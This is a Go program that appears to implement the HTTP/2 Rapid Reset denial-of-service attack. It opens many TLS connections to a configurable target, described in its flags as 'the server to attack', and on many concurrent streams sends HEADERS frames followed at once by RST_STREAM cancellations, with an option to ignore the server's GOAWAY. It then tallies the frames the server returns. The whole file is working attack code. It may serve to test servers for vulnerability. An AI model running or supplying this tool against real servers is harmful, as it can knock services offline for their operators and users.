package main

import (
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net/url"
	"strings"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
const (
	TIMEOUT = iota
	GOAWAY
	ERR
)

type ResultData struct {
	Headers      uint32
	GoAway       uint32
	Data         uint32
	Settings     uint32
	WindowUpdate uint32
	Ping         uint32
	Unknown      uint32
	RSTStream    uint32
}

type ReadFrameResult struct {
	ResultData
	Err int
	Conn int
}

type ReadFrameSummary struct {
	ResultData
	GoAwayEvents  uint32
	TimeoutEvents uint32
	ErrorEvents   uint32
}

func (rfs *ReadFrameSummary) Add(rfr ReadFrameResult) {
	var errs [3]uint32
	errs[rfr.Err] = 1

	rfs.Data += rfr.Data
	rfs.GoAway += rfr.GoAway
	rfs.Ping += rfr.Ping
	rfs.Unknown += rfr.Unknown
	rfs.Headers += rfr.Headers
	rfs.WindowUpdate += rfr.WindowUpdate
	rfs.Settings += rfr.Settings
	rfs.RSTStream += rfr.RSTStream
	
	rfs.TimeoutEvents = errs[0] + rfs.TimeoutEvents
	rfs.GoAwayEvents = errs[1] + rfs.GoAwayEvents
	rfs.ErrorEvents = errs[2] + rfs.ErrorEvents
}

var attempts = flag.Uint("attempts", 1, "maximum attempts per routine")
var sleep = flag.Int("delay", 1, "delay between sending HEADERS and RST_STREAM frames")
var ignoreGoAway = flag.Bool("ignoreGoAway", false, "ignore GOAWAY frames sent by the server")
var serverUrl = flag.String("url", "https://localhost:443/", "the server to attack")
var skipVerify = flag.Bool("skipValidation", true, "skip certificate verifcation")
var routines = flag.Int("routines", 1, "number of concurrent streams to attack")
var connections = flag.Int("connections", 1, "number of connections to open")

func createHeaderFrameParam(url *url.URL, streamId uint32) http2.HeadersFrameParam {
	var headerBlock bytes.Buffer

	// Encode headers
	encoder := hpack.NewEncoder(&headerBlock)

	encoder.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	encoder.WriteField(hpack.HeaderField{Name: ":path", Value: url.Path})
	encoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	encoder.WriteField(hpack.HeaderField{Name: ":authority", Value: url.Host})

	return http2.HeadersFrameParam{
		StreamID:      streamId,
		BlockFragment: headerBlock.Bytes(),
		EndStream:     true,
		EndHeaders:    true,
	}
}

func main() {
	flag.Parse()
	serverUrl, err := url.Parse(*serverUrl)
	if err != nil {
		log.Fatalf("invalid server url: %v", err)
	}

	conf := &tls.Config{
		InsecureSkipVerify: *skipVerify,
		NextProtos:         []string{"h2"},
	}

	ch := make(chan ReadFrameResult, *connections)
	for i := 0; i < *connections; i++ {
		log.Printf("create connection %d", i)
		go execute(serverUrl, conf, ch, i)
	}

	var summary ReadFrameSummary
	for rfr := range ch {
		log.Printf("%v", rfr)
		summary.Add(rfr)
	}
	summarize(ch)
}

func summarize(ch <-chan ReadFrameResult) {
	var summary ReadFrameSummary

	for rfr := range ch {
		printResult(rfr)
		summary.Add(rfr)
	}
	fmt.Println(strings.Repeat("#", 20) + "SUMMARY" + strings.Repeat("#", 20))
	fmt.Println("Packet types received:")
	fmt.Printf("\t PING: %d\n", summary.Ping)
	fmt.Printf("\t HEADERS: %d\n", summary.Headers)
	fmt.Printf("\t SETTINGS: %d\n", summary.Settings)
	fmt.Printf("\t DATA: %d\n", summary.Data)
	fmt.Printf("\t GOAWAY: %d\n", summary.GoAway)
	fmt.Printf("\t RSTSTREAM: %d\n", summary.RSTStream)
	fmt.Printf("\t WINDOWUPDATE: %d\n", summary.WindowUpdate)
	fmt.Printf("\t UNKNOWN: %d\n", summary.Unknown)
	fmt.Println("Attack ending reasons (per receiving thread):")
	fmt.Printf("\t GoAway events: %d\n", summary.GoAwayEvents)
	fmt.Printf("\t Timeout events: %d\n", summary.TimeoutEvents)
	fmt.Printf("\t Error events: %d\n", summary.ErrorEvents)
}

func printResult(result ReadFrameResult) {
	fmt.Printf("Summary for connection %d", result.Conn)
	fmt.Printf("\t PING: %d\n", result.Ping)
	fmt.Printf("\t HEADERS: %d\n", result.Headers)
	fmt.Printf("\t SETTINGS: %d\n", result.Settings)
	fmt.Printf("\t DATA: %d\n", result.Data)
	fmt.Printf("\t GOAWAY: %d\n", result.GoAway)
	fmt.Printf("\t RSTSTREAM: %d\n", result.RSTStream)
	fmt.Printf("\t WINDOWUPDATE: %d\n", result.WindowUpdate)
	fmt.Printf("\t UNKNOWN: %d\n", result.Unknown)
	
	var reason string
	switch result.Err {
	case 0:
		reason = "Timed out"
	case 1:
		reason = "GoAway - the server responded as expected."
	case 2:
		reason = "Error - we found some kind of error while evaluating the received packets"
	default:
		reason = "Unexpected result"
	}
	fmt.Printf("Reason for stopping to listen for more packets: %s", reason)
}

func execute(serverUrl *url.URL, conf *tls.Config, ch chan<- ReadFrameResult, connId int) {
	conn, err := tls.Dial("tcp", serverUrl.Host, conf)
	if err != nil {
		log.Fatalf("error establishing connection to %s: %v", serverUrl.Host, err)
	}

	log.Printf("established connection to %v", serverUrl)

	prefaceBytes := []byte(PREFACE)
	length, err := conn.Write(prefaceBytes)
	if err != nil || length != len(prefaceBytes) {
		log.Fatalf("error sending HTTP2 preface data. Sent %d bytes of %d: %v", length, len(prefaceBytes), err)
	}
	log.Printf("wrote HTTP2 preface")

	framer := http2.NewFramer(conn, conn)
	err = framer.WriteSettings()
	if err != nil {
		log.Fatalf("failed writing SETTINGS frame: %v (%v)", err, framer.ErrorDetail())
	}

	for {
		frame, err := framer.ReadFrame()
		if err != nil {
			log.Fatalf("failed reading frame: %v (%v)", err, framer.ErrorDetail())
		}

		if frame.Header().Type == http2.FrameSettings && frame.Header().Flags == http2.FlagSettingsAck {
			log.Println("received server SETTINGS ACK frame, continuing...")
			break
		}

		log.Printf("received unexpected frame: %v (Flags: %d). Expected SETTINGS ACK.", frame.Header().Type, frame.Header().Flags)
	}

	//at this point, the connection is established.

	var streamCounter atomic.Uint32 //according to https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers, stream IDs MUST be uneven for client-initiated requests
	streamCounter.Add(1)
	for i := 0; i < *routines; i++ {
		streamFramer := http2.NewFramer(conn, conn) //a framer may only be used by a single reader/writer
		go attack(streamFramer, serverUrl, &streamCounter)
	}
	ch <- readFrames(conn, connId)

	conn.Close()
}

func readFrames(conn *tls.Conn, connId int) ReadFrameResult {
	framer := http2.NewFramer(conn, conn) //a framer is fairly lightweight and we don't want to interfere with write operations, so let's read frames on a separate one.
	var rfr ReadFrameResult = ReadFrameResult{
		Conn: connId,
	}

	readDuration := time.Duration(10) * time.Second
	for {
		conn.SetReadDeadline(time.Now().Add(readDuration))
		frame, err := framer.ReadFrame()
		if err != nil {
			log.Printf("error reading response frame: %v", err)
			rfr.Err = ERR
			return rfr
		}
		log.Printf("found new frame headers: %v", frame.Header())

		switch frame.Header().Type {
		case http2.FrameHeaders:
			rfr.Headers++
		case http2.FrameSettings:
			rfr.Settings++
		case http2.FrameData:
			rfr.Data++
		case http2.FrameGoAway:
			rfr.GoAway++
			if !*ignoreGoAway {
				rfr.Err = GOAWAY
				return rfr
			}
		case http2.FramePing:
			rfr.Ping++
		case http2.FrameRSTStream:
			rfr.RSTStream++
		case http2.FrameWindowUpdate:
			rfr.WindowUpdate++
		default:
			rfr.Unknown++
		}
	}
}

func attack(framer *http2.Framer, url *url.URL, streamCounter *atomic.Uint32) {
	for i := uint(0); i < *attempts; i++ {
		streamId := streamCounter.Load()
		streamCounter.Add(2)
		err := framer.WriteHeaders(createHeaderFrameParam(url, streamId))
		if err != nil {
			log.Fatalf("unable to send initial HEADERS frame")
		}
		log.Printf("sent initial headers on stream %d", streamId)

		log.Printf("now sleeping for %d milliseconds", *sleep)
		time.Sleep(time.Millisecond * time.Duration(*sleep))

		err = framer.WriteRSTStream(streamId, http2.ErrCodeCancel)
		if err != nil {
			log.Fatalf("unable to write RST_STREAM frame: %v", err)
		}
		log.Print("Wrote RST_STREAM frame")
	}
}
